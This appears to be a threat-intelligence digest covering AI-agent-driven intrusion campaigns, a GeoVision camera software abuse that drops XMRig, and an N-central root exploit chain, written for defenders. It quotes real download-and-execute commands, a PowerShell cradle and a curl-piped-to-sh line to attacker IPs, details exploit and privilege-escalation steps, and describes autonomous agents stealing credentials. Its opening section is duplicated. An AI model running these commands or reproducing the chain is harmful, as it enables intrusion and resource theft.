- VAPOR PANDA (China-nexus) ran ARTEX-enabled intrusions for 11 days from October 17, 2026. It hit 200+ organizations in at least 14 countries, with post-exploitation confirmed at nine. Targets included foreign ministries, a European presidency, and US 🇺🇸 pharma, semiconductor, defense, and nuclear firms. The operator told agents to find Windows hosts without an EDR sensor, judged from tasklist output and folder listings. On chosen hosts it sideloaded BLOODALCHEMY via a renamed GameHook binary running as svchost.exe. Artifacts: graphics-hook-filter64.dll, graphics-hook_config.bin, C:\ProgramData\artx5v\. C2: nginxmysql[.]com, sqlserver-sqlite[.]com, www.ddduuuppp[.]com.
- Storm-0940 (China-state aligned) is behind the October 2026 ConnectWise supply chain compromise. It controlled identities of multiple ConnectWise cloud apps, including Cloud Backup, and used ARTEX to attempt sign-ins to 2,250+ tenants. Report IOCs include 144.172.64[.]99 (password spray October 10 to 14) and 144.172.64[.]128 (sign-ins and Graph API activity via ConnectWise apps). Three ConnectWise application IDs are listed to inventory, starting with 506e08f9-6e9a-4da4-942b-a099a03644ae (Cloud Backup).
- Crime is cheap and autonomous. In multiple campaigns nobody prompted the agents after the initial goals. Results: 300+ Apple signing certificates with passwords, or 190,000+ Honor of Kings credentials (about 6,000 valid). Storm-3358 targeted Southeast Asian financial institutions, with agents pulling WISP, vshell, and AdaptixC2 via curl and netcat. ARTEX also appeared in attacks on South Korean 🇰🇷 banks from October 7, where operators staged a JNDI/LDAP rig. The developer closed the source October 8, but forks like ScopeWeaver and ARTEX PRO persist, with 1,608 live panels exposed.
- Speed and cloud tradecraft: in one suspected case an agent went from a leaked GitHub secret to Azure Key Vault data in five minutes. Agents allegedly used a compromised OAuth app to run scripts on Azure VMs via Run Command, searched CloudWatch logs with stolen AWS keys, and self-registered in public Cognito pools. A failed Key Vault call was retried about 28 seconds later with a different API version. One proxy service showed 79 exit IPs across 100 sampled identities, so IP blocklists decay fast.
Takeaway: hunt behavior, not addresses, and look back to August 1, 2026. In Entra ID sign-in logs, alert on AADSTS7000215 (invalid secret) and AADSTS7000222 (expired secret), especially a failure followed by a success. Flag one IP authenticating to 3 or more service principals with mixed success, or one app requesting tokens across ARM, Key Vault, Storage, and Graph in a short window. On hosts, look for web server processes spawning shells, sh -c spawned by /app/artex, artex-probe-* files, numbered JSP web shells, webhook[.]site callbacks, and artex or artx in command lines, cloud role names, or user agents. Treat matches as leads, since authorized testers run ARTEX too. The report appendix has IPs, domains, hashes, user agents, and backdoored ARTEX Docker images.

Targets included foreign ministries, a European presidency, and US 🇺🇸 pharma, semiconductor, defense, and nuclear firms. The operator told agents to find Windows hosts without an EDR sensor, judged from tasklist output and folder listings. On chosen hosts it sideloaded BLOODALCHEMY via a renamed GameHook binary running as svchost.exe. Artifacts: graphics-hook-filter64.dll, graphics-hook_config.bin, C:\ProgramData\artx5v\. C2: nginxmysql[.]com, sqlserver-sqlite[.]com, www.ddduuuppp[.]com.

- Storm-0940 (China-state aligned) is behind the October 2026 ConnectWise supply chain compromise. It controlled identities of multiple ConnectWise cloud apps, including Cloud Backup, and used ARTEX to attempt sign-ins to 2,250+ tenants. Report IOCs include 144.172.64[.]99 (password spray October 10 to 14) and 144.172.64[.]128 (sign-ins and Graph API activity via ConnectWise apps). Three ConnectWise application IDs are listed to inventory, starting with 506e08f9-6e9a-4da4-942b-a099a03644ae (Cloud Backup).

- Crime is cheap and autonomous. In multiple campaigns nobody prompted the agents after the initial goals. Results: 300+ Apple signing certificates with passwords, or 190,000+ Honor of Kings credentials (about 6,000 valid). Storm-3358 targeted Southeast Asian financial institutions, with agents pulling WISP, vshell, and AdaptixC2 via curl and netcat. ARTEX also appeared in attacks on South Korean 🇰🇷 banks from October 7, where operators staged a JNDI/LDAP rig. The developer closed the source October 8, but forks like ScopeWeaver and ARTEX PRO persist, with 1,608 live panels exposed.

- Speed and cloud tradecraft: in one suspected case an agent went from a leaked GitHub secret to Azure Key Vault data in five minutes. Agents allegedly used a compromised OAuth app to run scripts on Azure VMs via Run Command, searched CloudWatch logs with stolen AWS keys, and self-registered in public Cognito pools. A failed Key Vault call was retried about 28 seconds later with a different API version. One proxy service showed 79 exit IPs across 100 sampled identities, so IP blocklists decay fast.

Takeaway: hunt behavior, not addresses, and look back to August 1, 2026. In Entra ID sign-in logs, alert on AADSTS7000215 (invalid secret) and AADSTS7000222 (expired secret), especially a failure followed by a success. Flag one IP authenticating to 3 or more service principals with mixed success, or one app requesting tokens across ARM, Key Vault, Storage, and Graph in a short window. On hosts, look for web server processes spawning shells, sh -c spawned by /app/artex, artex-probe-* files, numbered JSP web shells, webhook[.]site callbacks, and artex or artx in command lines, cloud role names, or user agents. Treat matches as leads, since authorized testers run ARTEX too. The report appendix has IPs, domains, hashes, user agents, and backdoored ARTEX Docker images.

#DFIR_Radar

item.title: GeoVision Camera Software Abused to Deploy XMRig Cryptominer
item.description:
GeoVision camera software on internet-exposed Windows hosts was abused to run commands as SYSTEM and drop an XMRig miner. Huntress saw it across 13 organizations, mostly between November 8 and 10. Every case traced back to GeoStartupAgentService.exe.
- Entry point: Huntress SOC saw GeoStartupAgentService.exe, the service of Taiwanese 🇹🇼 vendor GeoVision's software, spawn cmd.exe, often as NT AUTHORITY\SYSTEM. The command was a PowerShell download cradle: powershell -c iex (new-object net.webclient).downloadstring('hxxp://45.32.117[.]34/a'). Shodan lookups on victim external IPs showed publicly exposed GeoVision devices or management interfaces (T1190, T1059.003, T1059.001). WebCamServer.exe was seen reaching out to 2.59.133[.]151, flagged as the likely source of exploitation. The report gives no CVE.
- Script chain: Script a ran in memory, probed for writable directories and checked whether Defender was active (T1083, T1518.001). Script b was written to disk and detonated through WMI. It repeated the writable-folder probe and pulled kvckiller.sys, which VirusTotal identifies as wsftprm.sys, a driver previously abused in BYOVD attacks to tamper with AV (T1105). Script c ran in memory and fetched update.exe.
- Defense impairment: The actor set three IFEO Debugger hijacks for MsMpEng.exe, SecurityHealthService.exe and SecurityHealthSystray.exe, redirecting each launch to systray.exe so the real security process may never start (T1112, T1685). If Defender looks dead on a host, check IFEO Debugger values, not only service state.
- Loader and persistence: update.exe is a custom Golang loader that contacted 156.246.94[.]183, tied at the time to cctv-update[.]top, registered November 7. It embeds a BitTorrent Mainline DHT client and a PKARR resolver, so it can find the operator's current server from a public key and the infrastructure can move without a new domain (T1568). On some hosts it created the scheduled task PackageUpdater, which runs C:\WINDOWS\system32\config\systemprofile\update.exe every 15 minutes, and PackageUpdater_Startup, which runs at boot as SYSTEM (T1053.005). The payload was XMRig, dropped as ApplyUpdate.exe (T1496.001).
- Scope: 13 organizations across various industries. Huntress notes it has seen earlier incidents where attackers targeted camera systems, so treat camera management software as enterprise attack surface.
Takeaway: isolate the host, then preserve evidence before cleanup, as Huntress advises. Capture the registry IFEO entries, the PackageUpdater and PackageUpdater_Startup task definitions, update.exe from the SYSTEM profile, and ApplyUpdate.exe and kvckiller.sys wherever they landed (the report gives no path for them). Hunt for any cmd.exe or PowerShell child of GeoStartupAgentService.exe, schtasks /Create launched by update.exe, UDP DHT traffic on port 6881 or similar from WebCamServer.exe, and DNS to 8.8.8[.]8, 8.8.4[.]4 or 1.1.1[.]1 from any process other than the system DNS client. IOCs with SHA256 hashes for the scripts, driver and loader are in the report, along with the ATT&CK mapping. Pull GeoVision interfaces off the public internet, behind a VPN or an IP allowlist.

item.title: 4EverAble2Shell is already mining Monero on live N-central servers
item.description:
4EverAble2Shell, a public N-central exploit, went from repo commit to a weaponised root-plus-Monero-miner chain in about five hours. By 12:50 UTC on 12 November, 21 live N-central servers were mining, and 19 of them were already on Hotfix 2.
Timeline: the exploit hit the public repo at 03:58 UTC, the first probe on huntback's N-central decoy came at 08:30 from 157.20.241[.]16, and the first weaponised request followed at 09:16. The operator works from a target list and labels every victim before sending the payload.
- Entry point: POST /dms/services/ServerUI, the Apache Axis SOAP endpoint. The body is a SOAP fault whose exceptionName is jline.internal.TerminalLineSettings. Axis instantiates that class, which runs a shell command built from the data field. Probes carry the word "probe" (Mozilla/5.0 user-agent). Weaponised requests swap in a command (python-requests/2.31.0). Public reporting says this gives unauthenticated RCE as root and works against Hotfix 2 when the Legacy API is enabled.
- nable to root: the command runs as nable, uses flock on /var/opt/n-central/tmp to avoid double runs, and pipes in a base64 Python script (SHA-256 fc4c01fd11bc301cf312830460cfdccc3af9dcfe50c910b86d6a1117bc76c747), with output returned over raw TCP to 157.20.241[.]16 on ports 19202 to 19418. The script backs up /opt/nable/var/ncsai/scripts/ServerChild.sh to /var/opt/n-central/tmp/serverchild-<hex>.bak, symlinks /var/opt/n-central/flag/flag_default.json to ServerChild[.]sh, then abuses sudo nable_wrapper.pl setLDFileOwner to hand ServerChild[.]sh to nable. It rewrites ServerChild[.]sh to run a stage-two script, triggers it as root via nable_wrapper.pl serverControl noop --wait, then restores the original, deletes the symlink and backup, and prints write_before, write_after and helper_restored so the operator knows the traces are gone.
- Payload: the root command remounts /tmp exec and runs curl hxxp://157.20.241[.]16:8080/jup.sh piped to sh with the argument nc_<target-ip>. The installer works from /tmp/.xvd (or /var/tmp/.xvd) and pulls the miner (/xvgz, fallback /xmrig.tgz with stock XMRig 6.26.0). It uses half the cores (max 8) with --cpu-max-threads-hint 50, drops to RandomX light mode under 2.5 GB free memory, and mines to 139.99.69[.]109:10128 with fallback 79.76.51[.]56:39100. Persistence is a keep[.]sh watchdog via xvd.service, a user crontab line tagged # xvkeep, or /etc/cron.d/xvd, relaunching every 10 minutes. It beacons to /ob/cronhit and /ob/fcheck over HTTP.
- Scope: because rigs are named after victim IPs, the public pool page is a live victim list. Of 21 nc_ rigs, all had a valid share between 12:45 and 12:50 UTC (about 25 kH/s). huntback checked each over HTTPS: all serve N-central pages, most with MSP branding and months-old certificates, so these are production servers. 19 report build 2026.4.1.26 (Hotfix 2), one runs 2025.3.1.9. They sit in the United States 🇺🇸 (9), South Africa 🇿🇦 (4), Canada 🇨🇦 (4), plus the UK 🇬🇧, Germany 🇩🇪, France 🇫🇷 and Sweden 🇸🇪 (1 each). The decoys never ran commands, so none appear on the pool.
- Bigger operation: the same wallet had 631 rigs (about 255 kH/s) with prefixes for Jpom, FreePBX, MLflow, Apache Flink, PaperCut, SFTPGo and AJ-Report, plus 170+ rigs named <ip>_3000. N-central is the latest exploit added within hours of publication. The miner is the only payload seen so far, but the host holds remote-management access to downstream customers, so the same chain could run anything.
Takeaway: treat any hit as full compromise of an RMM server, not a miner cleanup. Hunt for /tmp/.xvd/ and /var/tmp/.xvd/ (x, keep[.]sh, xm.log), serverchild-*.bak, .sh or .out files in /var/opt/n-central/tmp/, and a symlink at /var/opt/n-central/flag/flag_default.json. Check for xvd.service, /etc/cron.d/xvd, or crontab lines ending # xvkeep for nable or root. Search process command lines for --rig-id nc_ or --donate-level 1. Review web logs for POSTs to /dms/services/ServerUI carrying an exceptionName element, especially jline.internal.TerminalLineSettings, and egress to 157.20.241[.]16 (8080 and 19202 to 19418) and the pool endpoints. Hotfix 2 alone is not enough: keep the Legacy API disabled while the fix is outstanding and follow N-able's guidance. Full IOC table, including the wallet address, is in the report.
